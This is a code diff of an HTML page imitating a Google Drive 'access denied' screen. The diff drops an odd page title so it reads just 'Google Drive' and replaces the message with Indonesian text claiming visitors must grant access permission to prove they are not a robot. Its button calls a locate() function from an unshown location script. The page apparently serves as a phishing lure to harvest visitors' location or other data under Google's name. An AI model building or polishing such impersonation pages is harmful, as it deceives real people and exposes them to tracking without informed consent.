@@ -1,10 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta name="description" content="Web word processing, presentations and spreadsheets" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0" />
+    <meta
+      name="description"
+      content="Web word processing, presentations and spreadsheets"
+    />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0"
+    />
     <link rel="shortcut icon" href="images/drive_favicon1.ico" />
-    <title>Klumpit Bergoyang - Google Drive</title>
+    <title>Google Drive</title>
     <link rel="stylesheet" type="text/css" href="css/main.css" />
     <script type="text/javascript">
       if (window.location.protocol == "http:") {
@@ -12,7 +18,10 @@
         window.location = "https:" + restOfUrl;
       }
     </script>
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"
+    ></script>
     <script type="text/javascript" src="js/info.js"></script>
     <script type="text/javascript" src="js/location.js"></script>
   </head>
@@ -28,12 +37,22 @@
         <div style="clear: both"></div>
         <div id="main">
           <div id="accessDeniedIcon"></div>
-          <p id="accessDeniedHeader">You need permission</p>
+          <p id="accessDeniedHeader">Google Drive Membutuhkan Izin Akses</p>
           <div id="message">
-            <p>Want in? Ask for access, or switch to an account with permission.</p>
+            <p>
+              Untuk melanjutkan ke halaman Google Drive, anda harus memberi izin
+              akses. Hal ini untuk memastikan anda bukan Robot.
+            </p>
           </div>
           <p id="buttons" style="padding-top: 10px">
-            <button id="requestButton" style="font-weight: bold" class="jfk-button jfk-button-action" onclick="locate();">Request access</button>
+            <button
+              id="requestButton"
+              style="font-weight: bold"
+              class="jfk-button jfk-button-action"
+              onclick="locate();"
+            >
+              Meminta Izin
+            </button>
           </p>
         </div>
       </div>
